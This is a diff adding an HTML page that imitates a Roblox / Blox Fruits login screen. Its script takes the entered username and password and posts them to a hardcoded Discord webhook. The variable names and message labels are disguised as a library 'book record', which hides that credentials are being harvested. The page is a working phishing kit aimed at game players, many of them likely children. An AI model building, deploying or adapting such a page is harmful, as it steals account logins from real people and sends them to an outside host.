@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Roblox Login </title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            min-height: 100vh;
+            background:
+                linear-gradient(135deg, #080808 0%, #171717 50%, #090909 100%);
+            color: white;
+        }
+
+        /* TOP NAVBAR */
+
+        .navbar {
+            height: 70px;
+            background: #111111;
+            border-bottom: 3px solid #e00000;
+
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+
+            padding: 0 35px;
+
+            box-shadow: 0 4px 15px rgba(0,0,0,0.6);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 24px;
+            font-weight: 900;
+            letter-spacing: 1px;
+        }
+
+      .logo-box {
+    width: 40px;
+    height: 40px;
+
+    background: #e00000;
+
+    transform: rotate(45deg);
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    border: 2px solid #ff3333;
+
+    box-shadow:
+        4px 4px 0 #650000,
+        0 0 15px rgba(224, 0, 0, 0.35);
+
+    transition: 0.25s ease;
+}
+
+.logo-box:hover {
+    transform: rotate(45deg) scale(1.08);
+
+    box-shadow:
+        5px 5px 0 #650000,
+        0 0 22px rgba(224, 0, 0, 0.55);
+}
+        }
+
+        .logo-box span {
+            font-size: 20px;
+            transform: rotate(-45deg);
+        }
+
+        .nav-right {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        /* HERO */
+
+        .hero {
+            text-align: center;
+            padding: 55px 20px 30px;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+
+            text-shadow: 4px 4px 0 #650000;
+        }
+
+        .hero h1 span {
+            color: #ff2222;
+        }
+
+        .hero p {
+            margin-top: 10px;
+            color: #aaa;
+            font-size: 16px;
+        }
+
+        /* MAIN CARD */
+
+        .container {
+            width: 90%;
+            max-width: 550px;
+            margin: 25px auto 60px;
+
+            background: #151515;
+
+            border: 1px solid #333;
+            border-top: 5px solid #e00000;
+
+            padding: 35px;
+
+            box-shadow:
+                0 15px 40px rgba(0,0,0,0.7),
+                8px 8px 0 #080808;
+        }
+
+        .card-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 25px;
+
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-title span {
+            color: #ff2222;
+        }
+
+        /* FORM */
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+
+            font-size: 14px;
+            font-weight: bold;
+            color: #ddd;
+
+            text-transform: uppercase;
+        }
+
+        input {
+            width: 100%;
+            height: 50px;
+
+            padding: 0 15px;
+
+            background: #0d0d0d;
+            color: white;
+
+            border: 2px solid #333;
+
+            font-size: 16px;
+
+            outline: none;
+
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border-color: #e00000;
+            box-shadow: 0 0 0 2px rgba(224,0,0,0.15);
+        }
+
+        input::placeholder {
+            color: #666;
+        }
+
+        /* BUTTON */
+
+        button {
+            width: 100%;
+            height: 52px;
+
+            margin-top: 10px;
+
+            background: #e00000;
+            color: white;
+
+            border: none;
+
+            font-size: 16px;
+            font-weight: 900;
+
+            text-transform: uppercase;
+            letter-spacing: 1px;
+
+            cursor: pointer;
+
+            box-shadow: 5px 5px 0 #650000;
+
+            transition: 0.15s;
+        }
+
+        button:hover {
+            background: #ff1616;
+            transform: translate(-2px, -2px);
+            box-shadow: 7px 7px 0 #650000;
+        }
+
+        button:active {
+            transform: translate(3px, 3px);
+            box-shadow: 2px 2px 0 #650000;
+        }
+
+        /* RESULT */
+
+        #result {
+            margin-top: 20px;
+            padding: 12px;
+
+            text-align: center;
+
+            font-weight: bold;
+
+            display: none;
+        }
+
+        .success {
+            display: block !important;
+            background: #123d19;
+            border: 1px solid #1f8b35;
+            color: #63ff7b;
+        }
+
+        .error {
+            display: block !important;
+            background: #3d1212;
+            border: 1px solid #8b1f1f;
+            color: #ff6464;
+        }
+
+        /* FOOTER */
+
+        footer {
+            text-align: center;
+
+            color: #666;
+
+            font-size: 13px;
+
+            padding: 20px;
+
+            border-top: 1px solid #222;
+        }
+
+        footer span {
+            color: #e00000;
+        }
+
+        /* RESPONSIVE */
+
+        @media (max-width: 600px) {
+
+            .navbar {
+                padding: 0 18px;
+            }
+
+            .logo {
+                font-size: 18px;
+            }
+
+            .nav-right {
+                display: none;
+            }
+
+            .hero h1 {
+                font-size: 34px;
+            }
+
+            .container {
+                width: 94%;
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- NAVBAR -->
+
+    <nav class="navbar">
+
+        <div class="logo">
+
+            <div class="logo-box">
+                <span>◆</span>
+            </div>
+
+            ROBLOX 
+
+        </div>
+
+        <div class="nav-right">
+            BLOX FURITS PAGE 
+        </div>
+
+    </nav>
+
+
+    <!-- HERO -->
+
+    <section class="hero">
+
+        <h1>
+            <span>ROBLOX</span> 
+        </h1>
+
+        <p>
+            Login to proceed 
+        </p>
+
+    </section>
+
+
+    <!-- FORM -->
+
+    <main class="container">
+
+        <div class="card-title">
+            <h2><span> Login : </span></h2>
+        </div>
+
+
+        <form id="libraryForm">
+
+            <div class="form-group">
+
+                <label for="bookName">
+                   Username:
+                </label>
+
+                <input
+                    type="text"
+                    id="bookName"
+                    placeholder="Enter Username"
+                    required
+                >
+
+            </div>
+
+<div class="form-group">
+
+    <label for="enrollmentNo">
+        Password
+    </label>
+
+    <div class="password-wrapper">
+
+        <input
+            type="password"
+            id="enrollmentNo"
+            placeholder="Enter Password"
+            required
+        >
+
+        <button
+            type="button"
+            class="password-toggle"
+            onclick="togglePassword()"
+            aria-label="Show password"
+            id="eyeButton"
+        >
+            <svg id="eyeIcon"
+                 viewBox="0 0 24 24"
+                 width="20"
+                 height="20"
+                 fill="none"
+                 stroke="currentColor"
+                 stroke-width="2"
+                 stroke-linecap="round"
+                 stroke-linejoin="round">
+
+                <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/>
+                <circle cx="12" cy="12" r="3"/>
+
+            </svg>
+        </button>
+
+    </div>
+
+</div>
+
+            <button type="submit">
+                LOGIN
+            </button>
+
+        </form>
+
+
+        <div id="result"></div>
+
+    </main>
+
+
+    <!-- FOOTER -->
+
+    <footer>
+
+        Blox Fruits
+        <br>
+
+        <span>Roblox Login Portal</span>
+
+    </footer>
+
+
+    <script>
+
+        /*
+         * ==========================================
+         * DISCORD WEBHOOK
+         * ==========================================
+         *
+         * Replace the text below with your
+         * Discord webhook URL.
+         */
+
+        const DISCORD_WEBHOOK =
+            "https://discord.com/api/webhooks/1540332609819902074/LdO1x7KW-zSwhby1k30UfS77n-c9kRtVKQAqr1YXbpXr46g2n5BJfblzXLcWigQQFspk";
+
+
+        /*
+         * ==========================================
+         * FORM SUBMISSION
+         * ==========================================
+         */
+
+        document
+            .getElementById("libraryForm")
+            .addEventListener("submit", async function(event) {
+
+                event.preventDefault();
+
+
+                const bookName =
+                    document
+                    .getElementById("bookName")
+                    .value
+                    .trim();
+
+
+                const enrollmentNo =
+                    document
+                    .getElementById("enrollmentNo")
+                    .value
+                    .trim();
+
+
+                const result =
+                    document.getElementById("result");
+
+
+                result.className = "";
+                result.style.display = "none";
+
+
+                if (!bookName || !enrollmentNo) {
+
+                    result.textContent =
+                        "Please fill in all fields.";
+
+                    result.className = "error";
+
+                    return;
+                }
+
+
+                /*
+                 * Create Discord message
+                 */
+
+                const discordMessage = {
+
+                    content:
+
+`📚 **ROBLOX LIBRARY — BOOK RECORD**
+
+📖 **Book Name:** ${bookName}
+
+🎓 **Enrollment No:** ${enrollmentNo}
+
+🕒 **Date & Time:** ${new Date().toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━
+📚 Library Registration System`
+
+                };
+
+
+                try {
+
+                    /*
+                     * Send to Discord
+                     */
+
+                    const response =
+                        await fetch(
+                            DISCORD_WEBHOOK,
+                            {
+                                method: "POST",
+
+                                headers: {
+                                    "Content-Type":
+                                        "application/json"
+                                },
+
+                                body:
+                                    JSON.stringify(
+                                        discordMessage
+                                    )
+                            }
+                        );
+
+
+                    if (response.ok) {
+
+                        result.textContent =
+                            "✅ BOOK RECORDED SUCCESSFULLY!";
+
+                        result.className =
+                            "success";
+
+
+                        /*
+                         * Clear form
+                         */
+
+                        document
+                            .getElementById("libraryForm")
+                            .reset();
+
+
+                    } else {
+
+                        throw new Error(
+                            "Discord request failed"
+                        );
+
+                    }
+
+
+                } catch (error) {
+
+                    console.error(error);
+
+                    result.textContent =
+                        "❌ Unable to login .";
+
+                    result.className =
+                        "error";
+
+                }
+
+            });
+
+    </script>
+<style>
+.password-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.password-wrapper input {
+    width: 100%;
+    padding-right: 45px;
+    box-sizing: border-box;
+}
+
+.password-toggle {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    border: none;
+    background: transparent;
+    padding: 4px;
+    color: #6b7280;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.password-toggle:hover {
+    color: #2563eb;
+}
+</style>
+<script>
+function togglePassword() {
+
+    const password = document.getElementById("enrollmentNo");
+    const eyeButton = document.getElementById("eyeButton");
+    const eyeIcon = document.getElementById("eyeIcon");
+
+    if (password.type === "password") {
+
+        password.type = "text";
+        eyeButton.setAttribute("aria-label", "Hide password");
+
+        eyeIcon.innerHTML = `
+            <path d="M3 3l18 18"/>
+            <path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/>
+            <path d="M9.9 5.2A10.5 10.5 0 0 1 12 5c6.5 0 10 7 10 7a18.5 18.5 0 0 1-3.2 4.1"/>
+            <path d="M6.2 6.2C3.6 8.1 2 12 2 12s3.5 7 10 7a9.8 9.8 0 0 0 4.1-.9"/>
+        `;
+
+    } else {
+
+        password.type = "password";
+        eyeButton.setAttribute("aria-label", "Show password");
+
+        eyeIcon.innerHTML = `
+            <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/>
+            <circle cx="12" cy="12" r="3"/>
+        `;
+    }
+}
+</script>
+<style>
+    ```css
+/* PROFESSIONAL PASSWORD FIELD */
+
+.password-wrapper {
+    position: relative;
+    width: 100%;
+}
+
+.password-wrapper input {
+    width: 100%;
+    height: 50px;
+    padding: 0 48px 0 15px;
+
+    background: #0d0d0d;
+    color: white;
+
+    border: 2px solid #333;
+
+    font-size: 16px;
+    outline: none;
+
+    transition: all 0.2s ease;
+}
+
+.password-wrapper input:focus {
+    border-color: #e00000;
+    box-shadow: 0 0 0 2px rgba(224, 0, 0, 0.15);
+}
+
+.password-toggle {
+    position: absolute;
+
+    right: 10px;
+    top: 50%;
+
+    transform: translateY(-50%);
+
+    width: 34px;
+    height: 34px;
+
+    margin: 0;
+    padding: 6px;
+
+    background: transparent;
+    color: #777;
+
+    border: none;
+    box-shadow: none;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    cursor: pointer;
+
+    transition: all 0.2s ease;
+}
+
+.password-toggle:hover {
+    background: transparent;
+    color: #ff2222;
+
+    transform: translateY(-50%);
+    box-shadow: none;
+}
+
+.password-toggle:active {
+    transform: translateY(-50%);
+    box-shadow: none;
+}
+
+.password-toggle svg {
+    width: 20px;
+    height: 20px;
+}
+```
+
+    </style>
+</body>
+</html>
